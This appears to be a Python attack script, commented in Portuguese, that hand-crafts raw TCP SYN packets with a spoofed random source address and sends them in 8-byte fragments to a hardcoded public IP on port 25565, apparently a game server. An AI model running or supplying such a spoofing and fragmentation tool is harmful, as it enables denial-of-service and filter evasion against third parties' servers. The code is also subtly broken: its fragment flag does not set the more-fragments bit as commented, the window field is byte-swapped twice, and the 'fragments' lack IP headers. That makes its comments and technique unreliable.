import socket
import time
from struct import pack
import random

def checksum(data):
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + (data[i+1] if i+1 < len(data) else 0)
        s = s + w
    s = (s >> 16) + (s & 0xffff)
    return ~s & 0xffff

def enviar_fragmentos_syn(ip_destino, porta_destino, intervalo):
    try:
        # Criar socket RAW
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        # IP de origem falso
        ip_origem_falsificado = f"192.168.{random.randint(0, 255)}.{random.randint(1, 254)}"
        
        # Cabeçalho IP
        ip_ihl_ver = (4 << 4) | 5
        ip_tot_len = 20 + 20
        ip_id = random.randint(0, 65535)
        ip_frag_off = 0b00100000  # Definir como fragmentado (more fragments)
        ip_ttl = 64
        ip_proto = socket.IPPROTO_TCP
        ip_checksum = 0
        ip_saddr = socket.inet_aton(ip_origem_falsificado)
        ip_daddr = socket.inet_aton(ip_destino)
        
        cabecalho_ip_sem_checksum = pack('!BBHHHBBH4s4s', ip_ihl_ver, 0, ip_tot_len, ip_id, ip_frag_off,
                                         ip_ttl, ip_proto, ip_checksum, ip_saddr, ip_daddr)
        ip_checksum = checksum(cabecalho_ip_sem_checksum)
        
        # Cabeçalho IP com checksum
        cabecalho_ip = pack('!BBHHHBBH4s4s', ip_ihl_ver, 0, ip_tot_len, ip_id, ip_frag_off,
                            ip_ttl, ip_proto, ip_checksum, ip_saddr, ip_daddr)

        # Cabeçalho TCP
        porta_origem = random.randint(1024, 65535)
        numero_sequencia = 0
        numero_ack = 0
        offset_reservado = (5 << 4) | 0
        flags = 0x02  # Flag SYN
        janela = socket.htons(5840)
        checksum_tcp = 0
        ponteiro_urgente = 0
        
        cabecalho_tcp_sem_checksum = pack('!HHLLBBHHH', porta_origem, porta_destino, numero_sequencia,
                                          numero_ack, offset_reservado, flags, janela, checksum_tcp, ponteiro_urgente)
        
        # Pseudo cabeçalho para cálculo do checksum TCP
        pseudo_cabecalho = pack('!4s4sBBH', ip_saddr, ip_daddr, 0, ip_proto, len(cabecalho_tcp_sem_checksum))
        checksum_tcp = checksum(pseudo_cabecalho + cabecalho_tcp_sem_checksum)
        
        cabecalho_tcp = pack('!HHLLBBHHH', porta_origem, porta_destino, numero_sequencia, numero_ack,
                             offset_reservado, flags, janela, checksum_tcp, ponteiro_urgente)
        
        # Pacote completo a ser fragmentado
        pacote_completo = cabecalho_ip + cabecalho_tcp
        
        # Enviar em fragmentos
        for i in range(0, len(pacote_completo), 8):  # Tamanho do fragmento (8 bytes por fragmento)
            fragmento = pacote_completo[i:i+8]
            sock.sendto(fragmento, (ip_destino, 0))
            print(f"Fragmento {i//8 + 1} enviado para {ip_destino}:{porta_destino}")
            time.sleep(intervalo)  # Atraso entre fragmentos

    except socket.error as e:
        print(f"Erro ao enviar fragmento para {ip_destino}: {e}")

    finally:
        sock.close()

# Parâmetros de teste
ip_destino = "185.107.192.36"
porta_destino = 25565
intervalo = 0.5  # 500ms entre fragmentos para simular o atraso
enviar_fragmentos_syn(ip_destino, porta_destino, intervalo)
